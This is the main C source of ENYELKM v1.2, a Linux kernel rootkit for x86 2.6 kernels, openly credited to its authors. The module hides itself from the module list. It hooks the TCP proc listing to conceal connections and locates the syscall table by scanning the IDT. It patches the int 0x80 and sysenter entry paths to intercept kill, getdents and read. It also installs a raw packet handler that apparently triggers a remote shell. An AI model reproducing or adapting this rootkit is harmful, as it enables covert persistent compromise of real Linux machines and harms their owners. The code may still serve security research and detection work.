/*
 * ENYELKM v1.2
 * Linux Rootkit x86 kernel v2.6.x
 *
 * By RaiSe && David Reguera
 * < raise@enye-sec.org
 *   davidregar@yahoo.es
 *   http://www.enye-sec.org >
 */

#include <linux/types.h>
#include <linux/stddef.h>
#include <linux/unistd.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <net/tcp.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include "config.h"
#include "data.h"
#include "syscalls.h"
#include "remoto.h"
#include "kill.h"
#include "read.h"
#include "ls.h"

#define ORIG_EXIT 19
#define DIRECALL 42
#define SALTO 5
#define SKILL 49
#define SGETDENTS64 57
#define SREAD 65
#define DAFTER_CALL 70
#define DNRSYSCALLS 10

#define ASMIDType( valor ) \
    __asm__ ( valor );

#define JmPushRet( valor )     \
    ASMIDType          \
    (              \
        "push %0   \n"     \
        "ret       \n"     \
                   \
        : : "m" (valor)    \
    );

#define CallHookedSyscall( valor ) \
    ASMIDType( "call *%0" : : "r" (valor) );


/* punteros a syscalls/funciones originales */
int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
asmlinkage int (*orig_kill)(pid_t pid, int sig);
asmlinkage long (*orig_getdents64)
	(unsigned int fd, struct dirent64 *dirp, unsigned int count);
asmlinkage long (*orig_getdents)
	(unsigned int fd, struct dirent *dirp, unsigned int count);


/* variables globales */
extern struct proc_dir_entry *proc_net;
unsigned long dire_exit, after_call;
unsigned long dire_call, global_ip;
short lanzar_shell;
atomic_t read_activo;
void *sysenter_entry;
void **sys_call_table;
struct packet_type my_pkt;
unsigned short global_port;
int errno;


/* prototipos funciones */
void *get_system_call(void);
void *get_sys_call_table(void *system_call);
void set_idt_handler(void *system_call);
void set_sysenter_handler(void *sysenter);
void *get_sysenter_entry(void);
void new_idt(void);
void hook(void);


/* estructuras */
struct idt_descriptor
	{
	unsigned short off_low;
	unsigned short sel;
	unsigned char none, flags;
	unsigned short off_high;
	};



int init_module(void)
{
void *s_call;
struct module *m = &__this_module;
struct proc_dir_entry *tcp = proc_net->subdir->next;

/* borramos nuestro modulo de la lista */
if (m->init == init_module)
	list_del(&m->list);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,7)
	kobject_unregister(&m->mkobj.kobj);
#endif

/* redefinimos tcp4_seq_show() */
while (strcmp(tcp->name, "tcp") && (tcp != proc_net->subdir))
    tcp = tcp->next;

if (tcp != proc_net->subdir)
	{
	orig_tcp4_seq_show = ((struct tcp_seq_afinfo *)(tcp->data))->seq_show;
	((struct tcp_seq_afinfo *)(tcp->data))->seq_show = hacked_tcp4_seq_show;

	#if DEBUG == 1
	printk("enyelkm: hacked_tcp4_seq_show() injectada!\n");
	#endif
	}

sysenter_entry = get_sysenter_entry();

/* variables de control */
lanzar_shell = 0;
atomic_set(&read_activo, 0);
global_ip = 0xffffffff;

/* averiguar sys_call_table */
s_call = get_system_call();
sys_call_table = get_sys_call_table(s_call);

/* punteros a syscalls originales */
orig_kill = sys_call_table[__NR_kill];
orig_getdents64 = sys_call_table[__NR_getdents64];
orig_getdents = sys_call_table[__NR_getdents];

/* modificar los handlers */
set_idt_handler(s_call);
set_sysenter_handler(sysenter_entry);

/* insertamos el nuevo filtro */
my_pkt.type=htons(ETH_P_ALL);
my_pkt.func=capturar;
dev_add_pack(&my_pkt);

#if DEBUG == 1
printk("enyelkm instalado!\n");
#endif

return(0);

} /*********** fin init_module ***********/



void cleanup_module(void)
{
/* dejar terminar procesos que estan 'leyendo' */
while (atomic_read(&read_activo) != 0)
    schedule();

#if DEBUG == 1
printk("enyelkm desinstalado!\n");
#endif

} /*********** fin cleanup_module ************/



void *get_system_call(void)
{
unsigned char idtr[6];
unsigned long base;
struct idt_descriptor desc;

asm ("sidt %0" : "=m" (idtr));
base = *((unsigned long *) &idtr[2]);
memcpy(&desc, (void *) (base + (0x80*8)), sizeof(desc));

return((void *) ((desc.off_high << 16) + desc.off_low)); 

} /*********** fin get_sys_call_table() ***********/



void *get_sys_call_table(void *system_call)
{
unsigned char *p;
unsigned long s_c_t;

p = (unsigned char *) system_call;

while (!((*p == 0xff) && (*(p+1) == 0x14) && (*(p+2) == 0x85)))
	p++;

dire_call = (unsigned long) p;

p += 3;
s_c_t = *((unsigned long *) p);

p += 4;
after_call = (unsigned long) p;

/* cli */
while (*p != 0xfa)
	p++;

dire_exit = (unsigned long) p;

return((void *) s_c_t);

} /********** fin get_sys_call_table() *************/



void set_idt_handler(void *system_call)
{
unsigned char *p;
unsigned long *p2;

p = (unsigned char *) system_call;

/* primer salto */
while (!((*p == 0x0f) && (*(p+1) == 0x83)))
    p++;

p -= 5;

*p++ = 0x68;
p2 = (unsigned long *) p;
*p2++ = (unsigned long) ((void *) new_idt);

p = (unsigned char *) p2;
*p = 0xc3;

/* syscall_trace_entry salto */
while (!((*p == 0x0f) && (*(p+1) == 0x82)))
    p++;

p -= 5;

*p++ = 0x68;
p2 = (unsigned long *) p;
*p2++ = (unsigned long) ((void *) new_idt);

p = (unsigned char *) p2;
*p = 0xc3;

} /********** fin set_idt_handler() ***********/



void set_sysenter_handler(void *sysenter)
{
unsigned char *p;
unsigned long *p2;

p = (unsigned char *) sysenter;

/* buscamos call */
while (!((*p == 0xff) && (*(p+1) == 0x14) && (*(p+2) == 0x85)))
    p++;

/* buscamos el jae syscall_badsys */
while (!((*p == 0x0f) && (*(p+1) == 0x83)))
    p--;

p -= 5;

/* metemos el salto */

*p++ = 0x68;
p2 = (unsigned long *) p;
*p2++ = (unsigned long) ((void *) new_idt);

p = (unsigned char *) p2;
*p = 0xc3;

} /************* fin set_sysenter_handler() **********/



void new_idt(void)
{
        ASMIDType
        (
        "cmp %0, %%eax      \n"
                "jae syscallmala        \n"
                "jmp hook               \n"

                "syscallmala:           \n"
                "jmp dire_exit          \n"

        : : "i" (NR_syscalls)
        );

} /********** fin new_idt() **************/



void hook(void)
{
    register int eax asm("eax");

    switch(eax)
    {
        case __NR_kill:
          CallHookedSyscall(hacked_kill);
 	      break;

		case __NR_getdents:
			CallHookedSyscall(hacked_getdents);
			break;

        case __NR_getdents64:
            CallHookedSyscall(hacked_getdents64);
    	    break;

        case __NR_read:
            CallHookedSyscall(hacked_read);
        	break;

        default:
            JmPushRet(dire_call);
	        break;
    }

    JmPushRet( after_call );

} /*********** fin hook() ************/



/* thx to Int27h :-) */
void *get_sysenter_entry(void)
{
void *psysenter_entry = NULL;
unsigned long v2;

if (boot_cpu_has(X86_FEATURE_SEP))
	rdmsr(MSR_IA32_SYSENTER_EIP, psysenter_entry, v2);
else
	return((void *) DSYSENTER);

return(psysenter_entry);

} /********** fin get_sysenter_entry() **********/



/* Licencia GPL */
MODULE_LICENSE("GPL");

/* EOF */
